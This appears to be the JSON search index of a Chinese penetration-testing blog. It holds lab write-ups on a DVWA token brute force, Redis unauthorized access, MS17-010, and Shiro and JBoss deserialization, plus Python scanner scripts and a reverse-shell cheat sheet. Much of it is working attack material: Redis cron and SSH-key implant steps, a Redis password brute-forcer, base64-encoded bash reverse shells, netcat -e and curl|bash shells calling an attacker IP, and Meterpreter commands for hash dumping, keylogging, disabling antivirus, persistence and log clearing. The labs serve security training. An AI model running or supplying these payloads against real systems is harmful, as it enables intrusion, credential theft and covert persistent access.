[{"title":"Burpsuite绕过Token爆破","url":"/2021/07/03/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/","content":"一、简介Token是服务器端生成的、下发给客户端的、用来对客户端身份进行验证的一种令牌；若是Token不匹配，则不会进行身份验证。所以需要对Token进行识别匹配，从而使密码爆破能够顺利进行。\n环境：\nDVWA + Burpsuite Pro\n二、流程1、使用DVWA的高级模式，进入爆破模块，进行抓包，并发送到攻击器。\n2、进行如下配置\nPosition模块 \n\n1：攻击模式选择Pitchfork，意为多对多，一一匹配。2、选定密码和token字段设置变量\n\n\n\nPaloads模块 – 1\n\n1：选定第一个变量（密码）2：攻击载荷选择简单列表3：选择从文件导入（这里做演示则随机添加了包含正确密码的若干密码）\n\n注意：1处需要配置第二个变量的密码模式（token），后续会对token配置，回头再回此设置。\nResource Pool模块\n（注：这里是最新版的多线程模块，老版本应在Request Engine处）\n\n多线程设置为1，因为token是服务器端生成的验证令牌，无法多线程爆破（一次只有一个token生效）\n\n\n\nOption模块\n选择Grep Extract模块\n\n点击Add，依次填写\n\n1：获取返回包内容2：匹配关键字token3：选定token值，自动生成匹配规则4：OK\n\n\n\nRedirections模块\n\n选定本次抓包的全部内容为重定向的范围（token在body的隐藏部分）\n\n\n\n最后，回到Payloads模块\n\n1：选定第二个变量2：选定payload类型--递归匹配（这里选完后自动加载了刚刚配置token的匹配规则--payload option部分）3：粘贴抓包部分的token值--需要给定初次抓包的匹配值4：配置完成，开始攻击\n\n\n\n3、结果\n\n可见token自动匹配，发包成功\n\n\n\n按照长度排序（状态码相同，无法参考）\n\n在返回包的Render部分，可见DVWA爆破成功的界面。\n至此，token绕过爆破攻击结束。\n","categories":["Web渗透"],"tags":["Token绕过"]},{"title":"centos7搭建DVWA","url":"/2021/07/02/centos7%E6%90%AD%E5%BB%BADVWA/","content":"一、准备Apache+Mysql+PHP+DVWA\n二、环境搭建安装Apache（httpd）yum install httpd httpd-devel httpd-manual httpd-tools\n\n\n\n启动apache并设置开机自启\nsystemctl start httpd  \t\t# 开启apachesystemctl enable httpd  \t# 设置开机自启systemctl status httpd  \t# 查看apache状态\n\n安装Mysqlyum install mariadb-server\n\n启动Mysql并设置开机自启\nsystemctl start mariadb \t \t# 开启mariadbsystemctl enable mariadb \t \t# 设置开机自启systemctl status mariadb  \t\t# 查看mariadb状态\n\n配置Mysql数据库\n初始化mysql数据库（全部回车确认）\nmysql_secure_installation\n\n设置mysql密码（非操作系统密码）\n配置\nmysql -uroot -pcreate database dvwa;\t\t\t# 创建数据库grant all privileges on *.* to dvwa@localhost identified by &#x27;dvwa&#x27;;\t\t# 创建用户\n\n\n\n安装PHP(php-fpm php-mysqlnd不装，其他均可)\nyum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap\n\n重启apache使php生效（php不是独立软件，依附apache）\nsystemctl restart httpd\n\n配置\nvim /etc/php.ini修改allow_url_include=Off为allow_url_include=On\n\n\n\n安装DVWAwget https://github.com/ethicalhack3r/DVWA/archive/master.zip\n\n解压并复制到/var/www/html目录\n配置\ncd /var/www/html/config/cp config.inc.php.dist config.inc.php\t\t# /DVWA/config目录下vim config.inc.php\t\t\t\t# 修改密码为dvwa$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;systemctl restart httpd\t\t\t\t\t\t# 重启apachechown -R apache:apache /var/www/html/\n\n\n\n三、访问环境http:localhost/setup.php\n\n创建数据库\n登录（admin:password）\n","categories":["环境搭建"],"tags":["DVWA"]},{"title":"Redis未授权访问漏洞复现","url":"/2021/06/28/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","content":"一、漏洞描述Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。\n二、漏洞特征开放6379端口，可尝试免密登录\n漏洞版本：Redis 2.x，3.x，4.x，5.x\nredis-cli -h x.x.x.x或redis-cli -h x.x.x.x -p 6379\n\n三、漏洞复现环境搭建攻击机：Kali2020.1\n靶机：Ubuntu20 + Redis2.8.17\n1、下载环境\nwget http://download.redis.io/releases/redis-2.8.17.tar.gz\n\n2、解压并进入安装目录\ntar xzf redis-2.8.17.tar.gzmake\n\n报错：\ngcc: Command not found\n\n解决：安装gcc\napt install gcc\n\n清理编译文件，重新编译\nmake distclean  &amp;&amp; make\n\n3、\n拷贝关键文件\ncp redis.conf /etc/cd srccp redis-benchmark redis-cli redis-server /usr/bin/\n\n4、启动\n./redis-server\t\t#src目录\n\n\n漏洞复现无密码登录redis-cli -h 192.168.24.79\t\t#登录\n\n \n登陆成功\n写webshell前提：登陆成功、知道路径（phpinfo或错误暴路径等）、读写权限等\n因为没有搭建网站环境，这里写在用户根目录\nconfig set dir /home/chen/config set dbfilename redis.php\tset webshell &quot;&lt;?php phpinfo();?&gt;&quot;或set x &quot;\\r\\n\\r\\n&lt;?php phpinfo();?&gt;\\r\\n\\r\\n&quot;save\n\n \n靶机成功写入\n \n定时反弹shell需要管理员权限\nnc -lvnp 4444\t\t# 攻击机开启监听# 连接redis，写定时反弹shellredis-cli -h 192.168.24.79config set dir /var/spool/cron/crontabsconfig set dbfilename rootset xxx &quot;\\n\\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.24.82/4444 0&gt;&amp;1\\n\\n&quot;\t\t#每分钟执行一次反弹连接save\n\n \n注意！\n1、Ubuntu系统需要以管理员权限更改/bin下的软链接指向\nln -s -f bash /bin/sh\t\t# 定时任务bash为dash,无交互功能\n\n2、Ubuntu下定时任务乱码则不执行，需手动删除乱码\n3、redis远程连接创建定时任务权限为644，但是定时任务权限需要为600才可执行\nchmod 600 root\n\n解决以上坑点，成功反弹shell\n \n但是这样意义不大，据说centos无以上坑点。\nssh登录1、攻击机生成ssh密钥（空密码）\nssh-keygen -t rsa\t\t# 全部回车cd .ssh/(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; key.txt\t\t# 写入公钥\n\n2、设置redis变量\ncat ./key.txt | redis-cli -h 192.168.24.79 -x set tide\t\t# 将公钥内容设置给redis变量（靶机ip）\n\n3、连接redis并写入\nredis-cli -h 192.168.24.79config set dir /root/.ssh\t\t\t\t\t# 默认公私钥路径config set dbfilename authorized_keys\t\t# 写入authorized_keyssave\n\n4、检查靶机文件是否写入–已写入（同样带有乱码）\n \n5、攻击机进行ssh连接\nssh -o StrictHostKeyChecking=no 192.168.24.79\t\t# 首次连接需要加-o StrictHostKeyChecking=no\n\n \n连接成功\n（注：靶机需要安装ssh服务并关闭防火墙，或者允许22端口通过防火墙）\n附Ubuntu安装ssh\nsudo apt-get install openssh-server\t\t# 安装sshsudo /etc/init.d/ssh start \t\t\t\t# 开启sshufw allow 22/tcp\t\t\t\t\t\t# 允许通过防火墙或sudo ufw disable\t\t\t\t\t\t# 不建议\n\n\n\n\n\n主从复制redis:4.x - redis:5.0.5版本漏洞，redis开启主从复制，主从数据相同，主redis只写，从redis只读，从而减小服务器压力。在Redis 4.x之后，Redis新增了模块功能，通过外部拓展，可以在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so恶意文件，就可以拓展新命令。\n到这里懒癌犯了，不想搭环境了，附上脚本下载链接，直接过，遇到回头再来。\nhttps://github.com/n0b0dyCN/redis-rogue-server\n\n这里还有个内网redis利用姿势–gopher协议，一并懒过去。\n暴力破解感觉这个比较实用，弱口令yyds！\n准备：\n打开redis.conf配置文件，找到requirepass，去掉注释，修改后面的参数，即为密码\n \n密码登录\nredis-cli -h 192.168.24.79 -a password\n\n\n\n以上，开始编写Python脚本\n#!/usr/bin/python# -*- coding:utf-8 -*-&quot;&quot;&quot;    描述：redis未授权访问探测 + 密码爆破    author: chen    date: 2021-07-03&quot;&quot;&quot;import socketimport sysimport threadingimport queueimport osdef poc():    global flag    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((ip, port))    # 发送INFO，如果无密码则返回服务器信息，包含版本信息；如果有密码，则返回“-NOAUTH Authentication required”    s.send(&#x27;INFO\\r\\n&#x27;.encode(&#x27;utf-8&#x27;))    result = s.recv(1024).decode(&#x27;utf-8&#x27;)    if &quot;redis_version&quot; in result:        print(&quot;存在redis未授权访问漏洞！&quot;)        flag = True    elif &quot;Authentication&quot; in result:        flag = False    else:        print(&quot;未知错误&quot;)        flag = None    s.close()def burst():    while not q.empty():        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        s.connect((ip, port))        _pass = q.get()        msg = &quot;AUTH &quot; + _pass + &quot;\\r\\n&quot;          # AUTH pass 为redis密码格式        s.send(msg.encode(&#x27;utf-8&#x27;))        result = s.recv(1024).decode(&#x27;utf-8&#x27;)        if &#x27;+OK&#x27; in result:            print(&quot;存在弱口令，密码为%s&quot; % _pass)            exit()if __name__ == &#x27;__main__&#x27;:    if len(sys.argv) != 5:        print(&quot;请按照格式输出：\\n&quot;)        print(&quot;redis.py 10.10.10.10 6379 字典名 线程数 \\n&quot;)    flag = True    q = queue.Queue()    ip = sys.argv[1]    port = int(sys.argv[2])    dic = sys.argv[3]    thread = sys.argv[4]    poc()    if flag:        exit()    else:        path = os.path.dirname(os.path.realpath(__file__))      # 获取当前脚本目录        for i in open(path + &#x27;/&#x27; + dic):            q.put(i.strip())                                    # 清洗字符，去掉头尾的换行和空格        for i in range(int(thread)):            t = threading.Thread(target=burst(), daemon=True)            t.start()    while True:        pass\n\n结果：\n空密码：\n\n设置密码\n\n四、修复指定ip登录在redis.conf文件找到# bind 127.0.0.1，去掉注释，修改为指定的登录ip\n缺点：多点登陆失效。\n增加密码打开redis.conf配置文件，找到requirepass，去掉注释，修改后面的参数，即为密码\n","categories":["漏洞复现"],"tags":["Redis未授权访问","Python脚本"]},{"title":"MS17-010漏洞复现","url":"/2021/06/28/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","content":"一、简介：MS17-010又称为永恒之蓝，通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞。目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。\n二、探测靶机：win7 x64 sp1 IP：192.168.66.98攻击机：kali 2020.4 IP：192.168.66.138\n1、通过nmap扫描目标机器，发现139、445端口nmap -V -T4 192.168.66.98   #T4设置扫描速度，越高越快（1-5）#-V显示详情\n\n\n结果：\n \n2、使用msf探测是否存在MS17-010漏洞a、寻找MS17-010模块\nsearch MS17-010\n\n发现2个探测模块和4个利用模块\n \n3、利用auxiliary/scanner/smb/smb_ms17_010探测模块进行漏洞探测use auxiliary/scanner/smb/smb_ms17_010   \t#调用探测模块show options                 \t\t\t\t#显示配置参数set RHOSTS 192.168.66.98          \t\t\t#设置目标IPrun                     \t\t\t\t\t#运行探测程序\n\n探测出存在MS17-010漏洞\n \n三、利用1、使用攻击模块对靶机发起攻击use exploit/windows/smb/ms17_010_eternalblue    #调用攻击模块show options                                    #显示配置参数set RHOSTS 192.168.66.98                        #设置目标IPrun                                             #运行探测程序\n\n\n攻击成功，进入后渗透攻击阶段\n\n2、靶机信息收集a、查看目标主机详细信息\nsysinfo\n\n \nb、查看当前获取的权限\ngetuid\n\n \nsystem权限，无需提权\n3、开启远程桌面run getgui -e\n\n \n成功开启远程桌面\n4、切换到cmd命令行模式shell\n\n \n5、添加用户net user  \n\n \nnet user hacker hacker.123 /add        #添加用户、密码net localgroup administrators hacker /add  #提权至管理员组net localgroup administrators        #查看管理员组成员\n\n \n提权成功\n6、开启远程桌面连接a、win+r，输入mstsc调出远程桌面，输入账号密码进行远程桌面连接\n \nb、成功连接至靶机\n \n至此，本次利用结束。后文附上meterpreter的其他指令，不做演示。\n附录\nsysinfo             #查看目标主机系统信息run scraper         #查看目标主机详细信息run hashdump        #导出密码的哈希load kiwi           #加载ps                  #查看目标主机进程信息pwd                 #查看目标当前目录(windows)getlwd              #查看目标当前目录(Linux)search -f *.jsp -d e:\\                #搜索E盘中所有以.jsp为后缀的文件download  e:\\test.txt  /root          #将目标机的e:\\test.txt文件下载到/root目录下upload    /root/test.txt d:\\test      #将/root/test.txt上传到目标机的 d:\\test\\ 目录下getpid              #查看当前Meterpreter Shell的进程PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上idletime            #查看主机运行时间getuid              #查看获取的当前权限getsystem           #提权run  killav         #关闭杀毒软件screenshot          #截图webcam_list         #查看目标主机的摄像头webcam_snap         #拍照webcam_stream       #开视频execute  参数  -f 可执行文件   #执行可执行程序run getgui -u hack -p 123    #创建hack用户，密码为123run getgui -e                #开启远程桌面keyscan_start                #开启键盘记录功能keyscan_dump                 #显示捕捉到的键盘记录信息keyscan_stop                 #停止键盘记录功能uictl  disable  keyboard     #禁止目标使用键盘uictl  enable   keyboard     #允许目标使用键盘uictl  disable  mouse        #禁止目标使用鼠标uictl  enable   mouse        #允许目标使用鼠标load                         #使用扩展库run                          #使用扩展库run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀portfwd add -l 3389 -r 192.168.11.13 -p 3389            #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址clearev                       \t\t\t\t\t\t\t#清除日志run post/windows/manage/migrate                  #自动进程迁移     run post/windows/gather/checkvm                  #查看目标主机是否运行在虚拟机上     run post/windows/manage/killav                   #关闭杀毒软件     run post/windows/manage/enable_rdp               #开启远程桌面服务     run post/windows/manage/autoroute                #查看路由信息     run post/windows/gather/enum_logged_on_users     #列举当前登录的用户     run post/windows/gather/enum_applications        #列举应用程序     run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码     run windows/gather/smart_hashdump                #dump出所有用户的hash\n\n","categories":["漏洞复现"],"tags":["MS17-010"]},{"title":"Shiro反序列化漏洞复现","url":"/2021/06/28/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","content":"1、探测在登录界面回包中，有rememberMe=deleteMe参数，说明使用Shiro反序列化。\n2、利用a、使用shiroExploit工具检测，反弹shell\nbash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\n\nb、使用xray检测，直接发送payload\nxray webscan --url &quot;http://&quot; --html-output 1.html\n\n或指定脚本检测\nxray webscan --url &quot;http://&quot; --plugins shiro --html-output 1.html\n\n将发包贴入burpsuite发包，将Testecho: namzzg修改为Testcmd:ls即可执行对应指令，也可反弹shell，语句同上\n","categories":["漏洞复现"],"tags":["Shiro反序列"]},{"title":"JBoss反序列化漏洞复现","url":"/2021/06/28/JBoss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","content":"1、确认漏洞及类型在jboss的url后缀添加如下信息，根据回显确定漏洞版本\na、访问/invoker/readonly，返回500则说明存在漏洞-&gt;CVE-2017-12149\nb、访问/jbossmq-httpil/HTTPServerILServlet，返回This is the JBossMQ HTTP-IL则存在漏洞-&gt;CVE-2017-7504\nc、访问/invoker/EJBInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2013-4810\nd、访问/invoker/JMXInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2015-7501\n2、制作payload工具：ysoserial.jar\n靶机：192.168.66.140（Ubuntu_vulhub）\n攻击机：192.168.66.138\n1、写反弹shellbash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1\n\n2、bash64加密，勾选bash（http://www.jackson-t.ca/runtime-exec-payloads.html）\nbash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\n\n3、使用ysoserial.jar制作payloadjava -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser\n\n注：CommonsCollections有1-10，5及以后有效\n4、攻击机开启端口监听nc -lvp 1111\n\n5、使用curl命令发送payloadcurl http:192.168.66.140:8080+试探目录 --data-binary @poc.ser\n\n注：poc版本&gt;=5\n6、成功反弹shell","categories":["漏洞复现"],"tags":["JBoss反序列化"]},{"title":"Python之网络爬虫","url":"/2021/06/27/Python%E4%B9%8B%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/","content":"一、简介借用网络爬虫脚本，记录下requests模块和bs4模块的知识点，以供日后查阅。\n二、模块梳理requests模块介绍：发送简单请求，获取响应\n使用：\nimport requests\t\t\t\t# 导包res = requests.get(url)\t\t# 发送get请求包（可换成.post）res.text\t\t\t\t\t# 获取返回包内容res.request\t\t\t\t\t# 获取请求包内容res.encoding  \t\t\t\t# 获取页面编码格式res.content\t\t\t  \t\t# http响应内容的二进制形式res.status_code\t\t\t\t# http响应码，200响应成功，404失败\n\n\n\nBeautifulSoup模块介绍：用于解析html/xml。\n使用\nfrom bs4 import BeautifulSoup\t\t\t\t# 导包soup = BeautifulSoup(&#x27;html&#x27;, &#x27;lxml&#x27;)\t\t# 获取html属性soup.title\t\t\t\t\t\t\t\t\t# 获取其中title内容,包括标签soup.title.string\t\t\t\t\t\t\t# 仅获取titlesoup.select\t\t\t\t\t\t\t\t\t# 指定某个元素下某个标签\tsoup.select(&#x27;.book-mulu &gt; ul &gt; li &gt; a&#x27;)\t同\tsoup.find(&#x27;div&#x27;,class_=&#x27;chapter_content&#x27;)soup.text\t\t\t\t\t\t\t\t\t# 获取标签内容find_all\t\t\t\t\t\t\t\t\t# 查找所有符合条件的元素find\t\t\t\t\t\t\t\t\t\t# 匹配第一个元素\n\n\n\n三、代码#!/usr/bin/python# -*- coding: utf-8 -*-&quot;&quot;&quot;    描述：借用网络爬虫脚本，梳理bs4、requests的简单使用    author：chen    date:2021-6-27&quot;&quot;&quot;import requestsfrom bs4 import BeautifulSoup# 自定义请求头headers = &#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#x27;&#125;def page_link(url):    con = &#x27;&#x27;    reponse = requests.get(url=url, headers=headers)    # 获取当前页面编码格式    code = reponse.encoding    # 对响应包的内容解码    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)    # 使用bs获取指定标签内容（需绑定解析器lxml）    soup = BeautifulSoup(page_text, &quot;lxml&quot;).select(&#x27;.onearcxsbd &gt; p&#x27;)    for i in soup:        # print(i.text)        con = con + i.text    return con# 程序入口if __name__ == &quot;__main__&quot;:    url = &#x27;https://www.xyyuedu.com/gdmz/sidamingzhu/sgyy/&#x27;      # 目标地址    reponse = requests.get(url=url, headers=headers)            # 获取请求    # print(reponse.text)    code = reponse.encoding                                     # 获取编码方式    # code = reponse.apparent_encoding    # print(code)    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)         # 先以网页原编码方式编码，在以指定格式解码，注意，数据仅以编码方式存储，但未进行编码    # print(page_text)    soup = BeautifulSoup(page_text, &quot;lxml&quot;)                     # 创建soup对象并指定解析器    aAttr = soup.select(&#x27;.zhangjie2 &gt; li &gt; a&#x27;)                  # 获得url所在的标签信息    # print(aAttr)    for i in aAttr:        # print(i.text)        title = i.text        link = &#x27;https://www.xyyuedu.com&#x27; + i[&#x27;href&#x27;]        # 获取章节连接        content = page_link(link)        print(&#x27;开始下载 \\n&#x27; + title)        # print(title)        # print(link)        # print(content)        with open(&#x27;./三国演义.txt&#x27;, &#x27;a&#x27;, encoding=&#x27;utf-8&#x27;) as fp:            fp.write(title + &#x27;\\n&#x27; + content + &#x27;\\n\\n\\n&#x27;)            print(title + &#x27;\\n&#x27; + &#x27;下载结束&#x27; + &#x27;\\n&#x27;)\n\n","categories":["Python"],"tags":["BeautifulSoup模块","requests模块"]},{"title":"Python之端口扫描","url":"/2021/06/27/Python%E4%B9%8B%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/","content":"一、前言借用端口扫描脚本，记录socket模块和threading模块知识点，以供日后查询。\n二、模块梳理socket模块介绍：网络发包请求模块\n使用\nimport socket\t\t\t\t\t\t# 导包s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) \t\t# 创建socket对象s.bind = ((host,port))\t\t\t\t# 绑定端口s.close\t\t\t\t\t\t\t\t# 断开连接s.send(msg.decode(&#x27;utf-8&#x27;))\t\t\t# 发送数据s.recv(1024)\t\t\t\t\t\t# 接受数据s.settimeout()\t\t\t\t\t\t# 设置超时时间，单位秒s.sendall\t\t\t\t\t\t\t# 发送完整TCP数据s.sendto\t\t\t\t\t\t\t# 发送udp数据# 服务端s.listen\t\t\t\t\t\t\t# 设置最大连接数csocket,addr = s.accept()\t\t\t# 建立客户端连接# 客户端s.connect((host,port))\t\t\t\t# 连接服务器\n\n\n\nthreading模块介绍：多线程模块\n使用\nimport threading\t\t\t\t\t\t\t# 导包t = threading.Thread(target=要执行的函数)\t\t# 设置要开启线程的函数t.start()\t\t\t\t\t\t\t\t\t# 开启线程# linux可直接Ctrl+c结束脚本，Windows下失效\n\n守护进程\nt = threading.Thread(target=要执行的函数, daemon=True)   # 设置守护进程，父进程结束则结束全部进程t.start()# 主线程空循环，防止结束，同时用来接收中断信号while True:\tpass# 用于Windows下接收Ctrl+c信号，结束脚本程序。\n\n线程锁，防止多个线程同时操作一个资源对象\nlock = threading.RLock() \t# 多线程开始之前定义lock.acquire()\t\t\t\t# 获取锁lock.release()\t\t\t\t# 释放锁\n\n三、代码#!/usr/bin/python# -*- coding: utf-8 -*-&quot;&quot;&quot;    描述：借用端口扫描项目，梳理套接字、多线程（守护进程、线程锁）的简单使用    author：chen    date:2021-6-27&quot;&quot;&quot;import socketimport sysimport queueimport threading# 全局变量，队列，用来依次存储端口号q = queue.Queue()def portScan():    while not q.empty():        port = q.get()        # 设置套接字连接        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        # 设置超时重连时间，单位秒，不设置会导致发包速度极慢，默认15秒        c.settimeout(0.5)        # connect.ex()会一直尝试连接，连接成功返回0，失败返回错误信息（key值）        if c.connect_ex((host, port)) == 0:            print(&quot;%s:%d is open&quot; % (host, port))            s = host + &quot;:&quot; + str(port)            # 开启进程锁，多线程写入数据            lock.acquire()            with open(&#x27;./ports.txt&#x27;, &#x27;a&#x27;) as fp:                fp.write(s + &quot;\\n&quot;)                # 释放锁            lock.release()        else:            print(&quot;%s:%d not open&quot; % (host, port))        # 关闭套接字连接        c.close()# 独立执行时的程序入口if __name__ == &quot;__main__&quot;:    #argv用来接收用户输入，按输入次序分别为argv[0-n],argv[0]表示脚本名    if len(sys.argv) &lt; 3:        print(&quot;请以以下格式输入：&quot;)        print(&quot;python portScan.py ip 线程数&quot;)    host = sys.argv[1]    thread_num = int(sys.argv[2])    # 在进程开始前，定义进程锁，不可在进程中定义锁，否则线程自己使用自己的锁，则失去进程锁的意义    lock = threading.RLock()    for port in range(1, 65536):        q.put(port)    for i in range(thread_num):        # 开启守护进程        t = threading.Thread(target=portScan, daemon=True)        t.start()    # 设置主进程死循环，方便接收中断信号    # 因为设置了守护进程，所以主进程结束，子进程也会立刻结束    while 1:        pass\n\n","categories":["Python"],"tags":["socket模块","threading模块"]},{"title":"Ubuntu安装Python3","url":"/2021/06/20/Ubuntu%E5%AE%89%E8%A3%85Python3/","content":"1、卸载旧版python\nsudo apt-get remove python\n\n2、安装新版python\nsudo apt-get install python3\n\n3、切换默认python环境\necho alias python=python3 &gt;&gt; ~/.bashrc  #切换python默认版本类型source ~/.bashrc  \t\t\t\t\t\t#更新配置文件的命令，只更新当前终端上的配置\n\n4、查看默认的python版本\npython --version\n\n","categories":["Linux"],"tags":["Python3"]},{"title":"Ubuntu搭建Docker + Vulhub","url":"/2021/06/20/Ubuntu%E6%90%AD%E5%BB%BADocker-Vulhub/","content":"安装docker1、在线安装docker\nsudo apt install docker.io -ydocker -v\t#查看版本\n\n2、安装pip\nsudo apt install python3-pip -y\n\n3、安装docker-compose\npip3 install docker-composedocker-compose -v\t\t#查看版本\n\n4、拉取vulhub\ngit clone https://github.com/vulhub/vulhub.git\t\t#在桌面环境\n\n\n\n\n\n1、查看正在运行的容器信息\ndocker ps\n\n2、进入容器目录\ndocker attach +容器ID或docker exec -it +容器ID /bin/bash\n\n3、退出容器\nexit\n\n\n\n其他命令：\ndocker-compose up -d\t\t#拉起容器镜像docker-compose down \t\t#关闭容器镜像\n\n","categories":["Linxu"],"tags":["Docker","Vulhub"]},{"title":"Windows多个Java环境共存","url":"/2021/06/20/Windows%E5%A4%9A%E4%B8%AAJava%E7%8E%AF%E5%A2%83%E5%85%B1%E5%AD%98/","content":"java8环境配置1、控制面板&gt; 系统&gt; 高级系统设置&gt; 环境变量&gt; 系统变量\n2、新建 JAVA_HOME\nC:\\Program Files\\Java\\jdk1.8.0_281\t\t#根据具体路径更改\n\n3、新建 CLASSPATH\n.;%JAVA_HOME%\\lib\\dt.jar;%JAVA_HOME%\\lib\\tools.jar;\n\n4、修改 Path\n%JAVA_HOME%\\bin;%JAVA_HOME%\\jre\\bin;\n\n5、重启\n其他：Path中改单行显示为多行显示，需要将其中一个绝对路径变量放在行首，如\nC:\\Windows\\System32;\t\t#低版本Windows系统不支持\n\n\n\njava11环境配置1、控制面板&gt; 系统&gt; 高级系统设置&gt; 环境变量&gt; 系统变量\n2、新建 JAVA_HOME\nC:\\Program Files\\Java\\jdk-11.0.10\t\t#根据具体路径更改\n\n3、修改 Path\n%JAVA_HOME%\\bin;\n\n\n\nJava版本切换1、新建JAVA_HOME、JAVA_HOME8、JAVA_HOME11\n2、新建java8.bat\nsetx JAVA_HOME &quot;%JAVA_HOME8%&quot; /m\n\n3、新建java11.bat\nsetx JAVA_HOME &quot;%JAVA_HOME11%&quot; /m\n\n","categories":[],"tags":["Java环境配置"]},{"title":"反弹shell归纳","url":"/2021/06/20/%E5%8F%8D%E5%BC%B9shell%E5%BD%92%E7%BA%B3/","content":"Linux反弹shell归纳注意：若是实战环境，反弹shell目标需要为公网ip。（搭服务器）\nBash反弹shellbash重定向，优先使用。\nbash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1&quot;# bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1\n\n以下是针对Bash反弹一句话进行了拆分说明：\n\n\n\n命令\n命令详解\n\n\n\nbash -i\n产生一个bash交互环境。\n\n\n&gt;&amp;\n将联合符号前面的内容与后面相结合，然后一起重定向给后者。\n\n\n/dev/tcp/47.xxx.xxx.72/2333\nLinux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。\n\n\n0&gt;&amp;1\n将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。\n\n\nBash反弹一句完整的解读过程就是：\nBash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。\n1、开启本地监听\nnc -lvvp 1111\n\n2、目标机反弹连接攻击机\nbash -c &quot;bash -i &gt;&amp;  /dev/tcp/192.168.66.138/1111 0&gt;&amp;1&quot;\n\n\n\n注意：利用工具写入反弹shell时，命令如下：bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=}|{base64,-d}|{bash,-i}\n其中，加密部分为bash -i &gt;&amp;  /dev/tcp/192.168.66.138/1111 0&gt;&amp;1的base64编码。IP、端口修改时需重新进行base64加密\nnetcat反弹shell1、linux默认自带netcat工具，但是反弹shell功能-e参数通常被阉割，需要手动下载二进制安装包。\nwget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gztar -xvzf netcat-0.7.1.tar.gz./configuremake &amp;&amp; make installmake clean\n\n2、攻击机开启本地监听\nnetcat -lvvp 1111\n\n3、目标机主动连接攻击机\nnetcat 192.168.66.138 1111 -e /bin/bash# netcat &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash\n\n\n\n\n\nCurl+Bash反弹shell借助Linux管道命令。\n1、在攻击者vps（公网）的web目录里面创建一个index文件（index.php或index.html），内容如下：\nbash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1\n\n2、开启本地监听\nnc -lvvp 1111\n\n3、在目标机器上执行如下代码，即可反弹shell\ncurl 192.168.66.138|bash\n\ncurl IP | 